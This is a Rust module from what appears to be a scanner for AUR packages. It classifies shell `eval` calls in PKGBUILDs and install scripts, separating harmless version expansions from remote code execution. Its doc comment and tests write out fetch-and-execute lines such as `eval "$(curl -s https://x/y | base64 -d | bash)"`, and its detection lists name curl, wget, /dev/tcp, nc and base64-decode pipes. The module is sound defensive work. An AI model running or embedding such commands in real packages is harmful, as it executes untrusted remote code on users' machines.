//! Classify the argument of `eval`.
//!
//! `P-EVAL-VAR = eval\s+["$]` cannot tell these apart:
//!
//! ```text
//! eval "$pkgver"                          # version bump idiom, benign
//! eval "$(curl -s x | base64 -d | bash)"  # remote code execution
//! ```
//!
//! Both are reported at 50 points, so a perfectly normal PKGBUILD lands at OK
//! while remote code execution is not gated. The distinction is fully lexical
//! and needs no statistics:
//!
//! - no command substitution (`$(`, backtick) in the argument -> a variable
//!   expansion, possibly quoted: a fact about a version string
//! - command substitution whose inner text downloads or decodes -> composition
//! - anything else dynamic -> a small capability
//!
//! The scan is scoped to executable regions so a heredoc of documentation or a
//! comment cannot produce a finding.

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::normalize::NormalizedView;
use crate::shared::regions::RegionKind;
use crate::shared::scoring::{Signal, SignalCategory, SignalRole};

/// Point values for the three classifications.
const POINTS_EVAL_SUBSTITUTION_EXEC: u32 = 95;
const POINTS_EVAL_SUBSTITUTION_DYNAMIC: u32 = 35;
const POINTS_EVAL_ARGUMENT_DYNAMIC: u32 = 15;

pub struct EvalAnalysis;

impl Feature for EvalAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let mut signals = Vec::new();
        if let Some(ref content) = ctx.pkgbuild_content {
            signals.extend(analyze_content(content, "", ""));
        }
        if let Some(ref content) = ctx.install_script_content {
            signals.extend(analyze_content(content, "IS-", "(in install script)"));
        }
        signals
    }
}

/// Find `eval` invocations in executable regions and classify each argument.
fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
    // Callers pass either "" or " (in install script)"; keep the separator in
    // one place so descriptions never read `pipeline(in install script)`.
    let desc_suffix = if desc_suffix.is_empty() {
        String::new()
    } else {
        format!(" {}", desc_suffix.trim())
    };
    let desc_suffix = desc_suffix.as_str();
    let view = NormalizedView::new(content);
    let text = view.masked();
    let structure = view.structure();

    // Only look inside function bodies; when structure is not trustworthy the
    // scanner reports the whole file as code, which is the conservative default.
    //
    // Two independent guards so a parser bug cannot turn data into a finding:
    // the region kind must be Function, and masked (heredoc / checksum /
    // header comment) offsets are skipped again below.
    let ranges = if structure.structure_ok {
        structure
            .regions
            .iter()
            .filter(|r| r.kind == RegionKind::Function)
            .map(|r| r.span.clone())
            .collect::<Vec<_>>()
    } else {
        // Whole file: the conservative fallback when structure is untrusted.
        std::vec![(0..text.chars().count())]
    };

    let chars: Vec<char> = text.chars().collect();
    let mut signals = Vec::new();

    for range in ranges {
        let mut i = range.start;
        while i < range.end {
            if !is_eval_at(&chars, i) {
                i += 1;
                continue;
            }
            let after = i + "eval".len();
            // Require whitespace after `eval` so `evaluate()` is not matched.
            if !chars.get(after).is_some_and(|c| c.is_whitespace()) {
                i = after;
                continue;
            }

            let Some((arg, arg_start, arg_end)) = read_argument(&chars, after, range.end) else {
                i = after;
                continue;
            };

            if view.is_masked_at(&(arg_start..arg_end)) {
                i = arg_end.max(after);
                continue;
            }

            let line = line_text(&chars, arg_start);
            match classify(&arg) {
                EvalClass::LiteralExpansion => {
                    // `eval "$pkgver"`: a fact. Reported so the report stays
                    // complete, but it adds no risk.
                    signals.push(
                        Signal::new(
                            &format!("{id_prefix}P-EVAL-EXPANSION"),
                            SignalCategory::Pkgbuild,
                            0,
                        )
                        .with_role(SignalRole::Fact)
                        .with_description(format!(
                            "eval of a variable expansion with no command substitution{desc_suffix}"
                        ))
                        .with_line(line),
                    );
                }
                EvalClass::SubstitutionExecutable => {
                    signals.push(
                        Signal::new(
                            &format!("{id_prefix}SA-EVAL-SUBST-EXEC"),
                            SignalCategory::Pkgbuild,
                            POINTS_EVAL_SUBSTITUTION_EXEC,
                        )
                        .with_role(SignalRole::Composition)
                        .with_description(format!(
                            "eval of a command substitution that downloads or decodes code{desc_suffix}"
                        ))
                        .with_line(line)
                        .as_gate(),
                    );
                }
                EvalClass::SubstitutionDynamic => {
                    signals.push(
                        Signal::new(
                            &format!("{id_prefix}SA-EVAL-SUBST"),
                            SignalCategory::Pkgbuild,
                            POINTS_EVAL_SUBSTITUTION_DYNAMIC,
                        )
                        .with_role(SignalRole::Capability)
                        .with_description(format!(
                            "eval of a command substitution with an unrecognised source{desc_suffix}"
                        ))
                        .with_line(line),
                    );
                }
                EvalClass::DynamicArgument => {
                    signals.push(
                        Signal::new(
                            &format!("{id_prefix}SA-EVAL-DYNAMIC"),
                            SignalCategory::Pkgbuild,
                            POINTS_EVAL_ARGUMENT_DYNAMIC,
                        )
                        .with_role(SignalRole::Capability)
                        .with_description(format!(
                            "eval of a dynamically built argument{desc_suffix}"
                        ))
                        .with_line(line),
                    );
                }
            }

            i = arg_end.max(after);
        }
    }

    signals
}

#[derive(Debug, PartialEq, Eq)]
enum EvalClass {
    LiteralExpansion,
    SubstitutionExecutable,
    SubstitutionDynamic,
    DynamicArgument,
}

/// Whether `eval` appears at `i` as a whole word.
fn is_eval_at(chars: &[char], i: usize) -> bool {
    let word: String = chars.iter().skip(i).take(4).collect();
    if word != "eval" {
        return false;
    }
    // Must not be part of a longer identifier.
    if i > 0 && (chars[i - 1].is_alphanumeric() || chars[i - 1] == '_') {
        return false;
    }
    true
}

/// Read the argument of `eval` starting at `i`, returning the raw argument
/// text plus its start and end offsets.
fn read_argument(chars: &[char], mut i: usize, end: usize) -> Option<(String, usize, usize)> {
    // Skip whitespace before the argument.
    while i < end && chars[i].is_whitespace() {
        i += 1;
    }
    if i >= end {
        return None;
    }
    let start = i;
    let mut depth = 0i32;
    let mut quote: Option<char> = None;

    while i < end {
        let c = chars[i];
        match quote {
            Some(q) => {
                if c == '\\' && q == '"' {
                    // Skip the escaped character, but never past the end: a
                    // trailing backslash would otherwise push `i` beyond the
                    // slice and panic on the final range below.
                    i = (i + 2).min(end);
                    continue;
                }
                if c == q {
                    quote = None;
                }
            }
            None => match c {
                '\'' | '"' => quote = Some(c),
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth < 0 {
                        break;
                    }
                }
                ';' | '\n' if depth == 0 => break,
                // A pipe or && ends the eval argument: the result is piped
                // elsewhere rather than evaluated.
                '|' | '&' if depth == 0 => break,
                _ => {}
            },
        }
        i += 1;
    }

    let stop = i.min(chars.len());
    let raw: String = chars[start..stop].iter().collect();
    Some((raw, start, stop))
}

fn classify(arg: &str) -> EvalClass {
    let has_substitution = arg.contains("$(") || arg.contains('`');

    if !has_substitution {
        return EvalClass::LiteralExpansion;
    }

    if substitution_is_executable(arg) {
        EvalClass::SubstitutionExecutable
    } else if arg.contains("$(") || arg.contains('`') {
        EvalClass::SubstitutionDynamic
    } else {
        EvalClass::DynamicArgument
    }
}

/// Whether the command substitution inside `arg` downloads or decodes code.
///
/// Matches the two families that matter for an `eval`: fetching remote content,
/// and decoding an encoded blob that is then executed.
fn substitution_is_executable(arg: &str) -> bool {
    let lower = arg.to_lowercase();
    let network = ["curl", "wget", "fetch ", "urllib", "requests.", "/dev/tcp", "nc ", "socat"]
        .iter()
        .any(|n| lower.contains(n));
    let decode = [
        "base64 -d",
        "base64 --decode",
        "base64 -D",
        "openssl enc -d",
        "openssl base64 -d",
        "xxd -r",
        "gunzip",
        "gzip -d",
    ]
    .iter()
    .any(|d| lower.contains(&d.to_lowercase()));
    let executes = ["| bash", "| sh", "|bash", "|sh", "bash -c", "sh -c", "| python", "|python"]
        .iter()
        .any(|e| lower.contains(e));

    // Inside an `eval` the fetched or decoded text *is* executed, so a bare
    // download is already remote code execution. `eval $(wget -qO- url)` never
    // writes a pipe for the pipe-chain analysis to see.
    network || (decode && executes)
}

/// Reconstruct the source line containing `pos`.
fn line_text(chars: &[char], pos: usize) -> String {
    let mut start = pos;
    while start > 0 && chars[start - 1] != '\n' {
        start -= 1;
    }
    let mut end = pos;
    while end < chars.len() && chars[end] != '\n' {
        end += 1;
    }
    chars[start..end].iter().collect::<String>().trim().to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shared::scoring::{ScanStatus, SignalRole};

    fn ctx(pkgbuild: &str) -> PackageContext {
        PackageContext {
            name: "test".into(),
            metadata: None,
            pkgbuild_content: Some(pkgbuild.to_string()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
            github_stars: None,
            github_not_found: false,
            aur_comments: vec![],
            local_sources: vec![],
            source_path: None,
            incomplete: vec![],
        }
    }

    fn analyze(pkgbuild: &str) -> Vec<Signal> {
        EvalAnalysis.analyze(&ctx(pkgbuild))
    }

    fn ids(signals: &[Signal]) -> Vec<&str> {
        signals.iter().map(|s| s.id.as_str()).collect()
    }

    #[test]
    fn eval_pkgver_is_a_zero_point_fact() {
        let signals = analyze("build() {\n  eval \"$pkgver\"\n}\n");
        assert_eq!(ids(&signals), vec!["P-EVAL-EXPANSION"]);
        assert_eq!(signals[0].role, SignalRole::Fact);
        assert_eq!(signals[0].points, 0);
    }

    #[test]
    fn eval_of_unquoted_version_is_a_fact() {
        let signals = analyze("build() {\n  eval $pkgver\n}\n");
        assert_eq!(signals[0].role, SignalRole::Fact);
    }

    #[test]
    fn eval_of_curl_pipe_is_gated() {
        let signals = analyze("build() {\n  eval \"$(curl -s https://x/y | bash)\"\n}\n");
        assert_eq!(ids(&signals), vec!["SA-EVAL-SUBST-EXEC"]);
        assert!(signals[0].is_override_gate);
        assert_eq!(signals[0].role, SignalRole::OverrideGate);
    }

    #[test]
    fn eval_of_decode_then_run_is_gated() {
        let signals = analyze("build() {\n  eval \"$(base64 -d payload | sh)\"\n}\n");
        assert_eq!(ids(&signals), vec!["SA-EVAL-SUBST-EXEC"]);
        assert!(signals[0].is_override_gate);
    }

    #[test]
    fn eval_of_wget_url_is_gated() {
        let signals = analyze("build() {\n  eval $(wget -qO- https://x/y)\n}\n");
        assert!(signals[0].is_override_gate);
    }

    #[test]
    fn eval_of_benign_substitution_is_a_capability_not_a_gate() {
        let signals = analyze("build() {\n  eval \"$(echo hello)\"\n}\n");
        assert_eq!(ids(&signals), vec!["SA-EVAL-SUBST"]);
        assert!(!signals[0].is_override_gate);
    }

    #[test]
    fn eval_inside_heredoc_is_ignored() {
        let pkgbuild = "build() {\n  cat <<EOF > x\neval \"$(curl https://x | bash)\"\nEOF\n}\n";
        let signals = analyze(pkgbuild);
        assert!(signals.is_empty(), "heredoc body is data: {signals:?}");
    }

    #[test]
    fn eval_inside_leading_comment_is_ignored() {
        let signals = analyze("# eval \"$(curl https://x | bash)\"\nbuild() {\n  :\n}\n");
        assert!(signals.is_empty());
    }

    #[test]
    fn evaluate_function_is_not_eval() {
        let signals = analyze("build() {\n  evaluate_thing \"$(curl https://x | bash)\"\n}\n");
        assert!(signals.is_empty(), "{signals:?}");
    }

    #[test]
    fn install_script_is_prefixed() {
        let mut c = ctx("build() {\n :\n}\n");
        c.install_script_content = Some("post_install() {\n  eval \"$(curl https://x | bash)\"\n}\n".into());
        let signals = EvalAnalysis.analyze(&c);
        assert!(ids(&signals).contains(&"IS-SA-EVAL-SUBST-EXEC"));
    }

    #[test]
    fn zig_shape_scores_trusted() {
        // The reproduced false positive: eval of a version variable.
        let pkgbuild = "pkgname=zig0.14-bin\npkgver=0.14.0\nbuild() {\n  eval \"$pkgver\"\n}\n";
        let ctx = ctx(pkgbuild);
        let signals = EvalAnalysis.analyze(&ctx);
        let result = crate::shared::scoring::compute_score_with_status(
            "zig0.14-bin",
            &signals,
            ScanStatus::Complete,
            None,
        );
        assert_eq!(result.tier, crate::shared::scoring::Tier::Trusted);
    }

    #[test]
    fn remote_code_execution_reaches_malicious() {
        let pkgbuild = "build() {\n  eval \"$(curl -s https://x/y | base64 -d | bash)\"\n}\n";
        let ctx = ctx(pkgbuild);
        let signals = EvalAnalysis.analyze(&ctx);
        let result = crate::shared::scoring::compute_score_with_status(
            "pkg",
            &signals,
            ScanStatus::Complete,
            None,
        );
        assert_eq!(result.tier, crate::shared::scoring::Tier::Malicious);
    }
}
